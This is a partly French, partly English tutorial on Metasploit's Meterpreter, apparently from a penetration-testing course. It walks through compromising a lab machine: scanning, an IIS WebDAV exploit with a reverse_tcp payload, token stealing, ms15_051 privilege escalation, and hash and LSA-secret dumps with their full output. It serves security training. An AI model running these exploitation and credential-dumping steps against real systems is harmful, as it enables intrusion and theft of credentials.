# Meterpreter

***

Le payload Meterpreter est un type spécifique de <mark style="color:orange;">**payload multi-fonctionnel**</mark> et extensible qui utilise <mark style="color:orange;">**l'injection de DLL**</mark> pour garantir une connexion stable au système cible et rendre sa détection difficile par des contrôles simples. Il peut également être configuré pour <mark style="color:orange;">**persister à travers les redémarrages**</mark> ou les modifications système. En outre, Meterpreter réside entièrement <mark style="color:orange;">**dans la mémoire de la machine distante**</mark> et ne laisse aucune trace sur le disque dur, ce qui le rend difficile à détecter avec des techniques de forensic classiques.

&#x20;Il peut nous aider à trouver diverses techniques d’escalade de privilèges, d’évasion des antivirus, à effectuer des recherches supplémentaires de vulnérabilités, à fournir un accès persistant, à pivoter, etc.

***

### <mark style="color:blue;">Exécution de Meterpreter</mark>

Pour exécuter Meterpreter, il suffit de sélectionner l’une de ses versions depuis la sortie de **`show payloads`**, en tenant compte du type de connexion et du système d’exploitation cible.

Lorsque l'exploit est terminé, les événements suivants se produisent :

1. La cible exécute le _stager_ initial, qui peut être un mode de liaison (_bind_), un mode inverse (_reverse_), un mode de recherche (_findtag_), _passivex_, etc.
2. Le _stager_ charge la DLL préfixée par _Reflective_. Le _stub_ reflectif gère le chargement et l'injection de la DLL.
3. Le noyau de Meterpreter s’initialise, établit une connexion chiffrée avec AES via le socket et envoie une requête GET. Metasploit reçoit cette requête GET et configure le client.
4. Enfin, Meterpreter charge les extensions. Il charge toujours _stdapi_ et charge _priv_ si le module dispose des droits administratifs. Toutes ces extensions sont chargées avec un chiffrement AES.

À chaque fois que le payload Meterpreter est envoyé et exécuté sur le système cible, nous obtenons un **shell Meterpreter**. Nous pouvons alors immédiatement utiliser la commande **`help`** pour voir toutes les capacités du shell Meterpreter.

<mark style="color:green;">**MSF - Meterpreter Commands**</mark>

```shell-session
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
```

Some of these commands are also available in the module cheat sheet for reference.

The main idea we need to get about Meterpreter is that it is just as good as getting a direct shell on the target OS but with more functionality. The developers of Meterpreter set clear design goals for the project to skyrocket in usability in the future. Meterpreter needs to be:

* Stealthy
* Powerful
* Extensible

***

### <mark style="color:blue;">Discret</mark>

Une fois lancé et arrivé sur la cible, Meterpreter réside entièrement en mémoire et n'écrit rien sur le disque. Il ne crée aucun nouveau processus, car il s'injecte directement dans un processus compromis. De plus, il peut migrer d’un processus en cours d’exécution à un autre. Dans la version mise à jour de **msfconsole-v6**, toutes les communications du payload Meterpreter entre l’hôte cible et l’attaquant sont chiffrées avec AES, garantissant la confidentialité et l’intégrité des échanges de données. Ces éléments limitent les traces forensic que l’on pourrait retrouver et minimisent l'impact sur la machine de la victime.

### <mark style="color:blue;">Puissant</mark>

Meterpreter utilise un système de communication canalisé entre l'hôte cible et l'attaquant, ce qui est très utile. Par exemple, il est possible de lancer un shell de l'OS de la cible directement depuis Meterpreter, en ouvrant un canal dédié. Ce système permet également d'assurer un trafic chiffré par AES.

### <mark style="color:blue;">Extensible</mark>

Les fonctionnalités de Meterpreter peuvent être constamment augmentées à l'exécution et chargées via le réseau. Sa structure modulaire permet d’ajouter de nouvelles fonctionnalités sans nécessiter de reconstruction.

### <mark style="color:blue;">Utiliser Meterpreter</mark>

<mark style="color:orange;">**MSF - Scanning Target**</mark>

```bash
msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15

[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 09:55 UTC
[*] Nmap: Nmap scan report for 10.10.10.15
[*] Nmap: Host is up (0.021s latency).

msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.15             Unknown                    device         


msf6 > services

Services
========

host         port  proto  name  state  info
----         ----  -----  ----  -----  ----
10.10.10.15  80    tcp    http  open   Microsoft IIS httpd 6.0
```

Next, we look up some information about the services running on this box. Specifically, we want to explore port 80 and what kind of web service is hosted there.

<div align="left" data-full-width="false"><figure><img src="https://academy.hackthebox.com/storage/modules/39/S12_SS01.png" alt=""><figcaption></figcaption></figure></div>

We notice it is an under-construction website—nothing web-related to see here.&#x20;

However, looking at both the end of the webpage and the result of the Nmap scan more closely, we notice that the server is running `Microsoft IIS httpd 6.0`.&#x20;

So we further our research in that direction, searching for common vulnerabilities for this version of IIS. After some searching, we find the following marker for a widespread vulnerability: `CVE-2017-7269`. It also has a Metasploit module developed for it.

<mark style="color:orange;">**MSF - Searching for Exploit**</mark>

```shell-session
msf6 > search iis_webdav_upload_asp

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/windows/iis/iis_webdav_upload_asp  2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution


msf6 > use 0

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp


msf6 exploit(windows/iis/iis_webdav_upload_asp) > show options

Module options (exploit/windows/iis/iis_webdav_upload_asp):

   Name          Current Setting        Required  Description
   ----          ---------------        --------  -----------
   HttpPassword                         no        The HTTP password to specify for authentication

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.239.181   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

We proceed to set the needed parameters. For now, these would be `LHOST`and `RHOST` as everything else on the target seems to be running the default configuration.

<mark style="color:orange;">**MSF - Configuring Exploit & Payload**</mark>

```shell-session
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15

RHOST => 10.10.10.15


msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0

LHOST => tun0


msf6 exploit(windows/iis/iis_webdav_upload_asp) > run

meterpreter > 
```

We have our Meterpreter shell. However, take a close look at the output above. We can see a `.asp` file named `metasploit28857905` exists on the target system at this very moment. Once the Meterpreter shell is obtained, as mentioned before, it will reside within memory. Therefore, the file is not needed, and removal was attempted by `msfconsole`, which failed due to access permissions. Leaving traces like these is not beneficial to the attacker and creates a huge liability.

From the sysadmin's perspective, finding files that match this name type or slight variations of it can prove beneficial to stopping an attack in the middle of its tracks. Targeting regex matches against filenames or signatures as above will not even allow an attacker to spawn a Meterpreter shell before being cut down by the correctly configured security measures.

We proceed further with our exploits. Upon attempting to see which user we are running on, we get an access denied message. We should try migrating our process to a user with more privilege.

<mark style="color:orange;">**MSF - Meterpreter Migration**</mark>

{% code fullWidth="true" %}
```bash
meterpreter > getuid

[-] 1055: Operation failed: Access is denied.


meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 216   1080  cidaemon.exe                                                    
 272   4     smss.exe                                                        
 292   1080  cidaemon.exe                                                    
<...SNIP...>

 1712  396   alg.exe                                                         
 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1920  396   dllhost.exe                                                     
 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe
 2312  592   wmiprvse.exe                                                    
 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 4076  1080  cidaemon.exe                                                    


meterpreter > steal_token 1836

Stolen token with username: NT AUTHORITY\NETWORK SERVICE


meterpreter > getuid

Server username: NT AUTHORITY\NETWORK SERVICE
```
{% endcode %}

Now that we have established at least some privilege level in the system, it is time to escalate that privilege. So, we look around for anything interesting, and in the `C:\Inetpub\` location, we find an interesting folder named `AdminScripts`. However, unfortunately, we do not have permission to read what is inside it.

<mark style="color:orange;">**MSF - Interacting with the Target**</mark>

```cmd-session
c:\Inetpub>dir

dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of c:\Inetpub

04/12/2017  05:17 PM    <DIR>          .
04/12/2017  05:17 PM    <DIR>          ..
04/12/2017  05:16 PM    <DIR>          AdminScripts
09/03/2020  01:10 PM    <DIR>          wwwroot
               0 File(s)              0 bytes
               4 Dir(s)  18,125,160,448 bytes free


c:\Inetpub>cd AdminScripts

cd AdminScripts
Access is denied.
```

We can easily decide to run <mark style="color:orange;">**the local exploit suggester module**</mark>, attaching it to the currently active Meterpreter session. To do so, we background the current Meterpreter session, search for the module we need, and set the SESSION option to the index number for the Meterpreter session, binding the module to it.

<mark style="color:orange;">**MSF - Session Handling**</mark>

{% code fullWidth="true" %}
```shell-session
meterpreter > bg

Background session 1? [y/N]  y


msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1

SESSION => 1


msf6 post(multi/recon/local_exploit_suggester) > run


msf6 post(multi/recon/local_exploit_suggester) > 
```
{% endcode %}

Running the recon module presents us with a multitude of options. Going through each separate one, we land on the `ms15_051_client_copy_image` entry, which proves to be successful. This exploit lands us directly within a root shell, giving us total control over the target system.

<mark style="color:orange;">**MSF - Privilege Escalation**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp


msf6 exploit(windows/local/ms15_051_client_copy_image) > show options

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     46.101.239.181   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1

session => 1


msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0

LHOST => tun0


msf6 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.14.26:4444 
[*] Launching notepad to host the exploit...

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```
{% endcode %}

From here, we can proceed to use the plethora of Meterpreter functionalities. For example, extracting hashes, impersonating any process we want, and others.

<mark style="color:orange;">**MSF - Dumping Hashes**</mark>

{% code fullWidth="true" %}
```shell-session
meterpreter > hashdump

Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::


meterpreter > lsa_dump_sam

[+] Running as SYSTEM
[*] Dumping SAM
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
Local SID : S-1-5-21-1709780765-3897210020-3926566182

SAMKey : 37ceb48682ea1b0197c7ab294ec405fe

RID  : 000001f4 (500)
User : Administrator
  Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf
  Hash NTLM: d6908f022af0373e9e21b8a241c86dca

RID  : 000001f5 (501)
User : Guest

RID  : 000003e9 (1001)
User : SUPPORT_388945a0
  Hash NTLM: 8ed3993efb4e6476e4f75caebeca93e6

RID  : 000003eb (1003)
User : IUSR_GRANPA
  Hash LM  : a274b4532c9ca5cdf684351fab962e86
  Hash NTLM: 6a981cb5e038b2d8b713743a50d89c88


```
{% endcode %}

<mark style="color:orange;">**MSF - Meterpreter LSA Secrets Dump**</mark>

<pre class="language-shell-session" data-full-width="true"><code class="lang-shell-session">meterpreter > lsa_dump_secrets

[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb

Local name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )
Domain name : HTB

Policy subsystem is : 1.7
LSA Key : ada60ee248094ce782807afae1711b2c

Secret  : aspnet_WP_PASSWORD
cur/text: Q5C'181g16D'=F

Secret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV
cur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2 

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63 
    full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63
    m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63

Secret  : L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75
cur/hex : 52 53 41 32 48 00 00 00 00 02 00 00 3f 00 00 00 01 00 01 00 b3 ec 6b 48 4c ce e5 48 f1 cf 87 4f e5 21 00 39 0c 35 87 88 f2 51 41 e2 2a e0 01 83 a4 27 92 b5 30 12 aa 70 08 24 7c 0e de f7 b0 22 69 1e 70 97 6e 97 61 d9 9f 8c 13 fd 84 dd 75 37 35 61 89 c8 00 00 00 00 00 00 00 00 97 a5 33 32 1b ca 65 54 8e 68 81 fe 46 d5 74 e8 f0 41 72 bd c6 1e 92 78 79 28 ca 33 10 ff 86 f0 00 00 00 00 45 6d d9 8a 7b 14 2d 53 bf aa f2 07 a1 20 29 b7 0b ac 1c c4 63 a4 41 1c 64 1f 41 57 17 d1 6f d5 00 00 00 00 59 5b 8e 14 87 5f a4 bc 6d 8b d4 a9 44 6f 74 21 c3 bd 8f c5 4b a3 81 30 1a f6 e3 71 10 94 39 52 00 00 00 00 9d 21 af 8c fe 8f 9c 56 89 a6 f4 33 f0 5a 54 e2 21 77 c2 f4 5c 33 42 d8 6a d6 a5 bb 96 ef df 3d 00 00 00 00 8c fa 52 cb da c7 10 71 10 ad 7f b6 7d fb dc 47 40 b2 0b d9 6a ff 25 bc 5f 7f ae 7b 2b b7 4c c4 00 00 00 00 89 ed 35 0b 84 4b 2a 42 70 f6 51 ab ec 76 69 23 57 e3 8f 1b c3 b1 99 9e 31 09 1d 8c 38 0d e7 99 57 36 35 06 bc 95 c9 0a da 16 14 34 08 f0 8e 9a 08 b9 67 8c 09 94 f7 22 2e 29 5a 10 12 8f 35 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

Secret  : L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588
cur/hex : 00 f2 d1 31 e2 11 d3 01 

Secret  : L$TermServLiceningSignKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L$TermServLicensingExchKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L$TermServLicensingServerId-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L$TermServLicensingStatus-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L${6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A}
cur/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e ee da a8 bb f6 1a b1 f4 03 cf 7a f1 7f 4c bc fc b4 84 36 40 6a 34 f9 89 56 aa f4 43 ef 85 58 38 3b a8 34 f0 dc c3 7f 
old/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e c8 e9 13 e6 5f 17 a9 42 93 c2 e3 4c 8c c3 59 b8 c2 dd 12 a9 6a b2 4c 22 61 5f 1f ab ab ff 0c e0 93 e2 e6 bf ea e7 16 

Secret  : NL$KM
cur/hex : 91 de 7a b2 cb 48 86 4d cf a3 df ae bb 3d 01 40 ba 37 2e d9 56 d1 d7 85 cf 08 82 93 a2 ce 5f 40 66 02 02 e1 1a 9c 7f bf 81 91 f0 0f f2 af da ed ac 0a 1e 45 9e 86 9f e7 bd 36 eb b2 2a 82 83 2f 

Secret  : SAC

Secret  : SAI

Secret  : SCM:{148f1a14-53f3-4074-a573-e1ccd344e1d0}

<strong>Secret  : SCM:{3D14228D-FBE1-11D0-995D-00C04FD919C1}
</strong>
Secret  : _SC_Alerter / service 'Alerter' with username : NT AUTHORITY\LocalService

Secret  : _SC_ALG / service 'ALG' with username : NT AUTHORITY\LocalService

Secret  : _SC_aspnet_state / service 'aspnet_state' with username : NT AUTHORITY\NetworkService

Secret  : _SC_Dhcp / service 'Dhcp' with username : NT AUTHORITY\NetworkService

Secret  : _SC_Dnscache / service 'Dnscache' with username : NT AUTHORITY\NetworkService

Secret  : _SC_LicenseService / service 'LicenseService' with username : NT AUTHORITY\NetworkService

Secret  : _SC_LmHosts / service 'LmHosts' with username : NT AUTHORITY\LocalService

Secret  : _SC_MSDTC / service 'MSDTC' with username : NT AUTHORITY\NetworkService

Secret  : _SC_RpcLocator / service 'RpcLocator' with username : NT AUTHORITY\NetworkService

Secret  : _SC_RpcSs / service 'RpcSs' with username : NT AUTHORITY\NetworkService

Secret  : _SC_stisvc / service 'stisvc' with username : NT AUTHORITY\LocalService

Secret  : _SC_TlntSvr / service 'TlntSvr' with username : NT AUTHORITY\LocalService

Secret  : _SC_WebClient / service 'WebClient' with username : NT AUTHORITY\LocalService
</code></pre>

From this point, if the machine was connected to a more extensive network, we could use this loot to pivot through the system, gain access to internal resources and impersonate users with a higher level of access if the overall security posture of the network is weak.
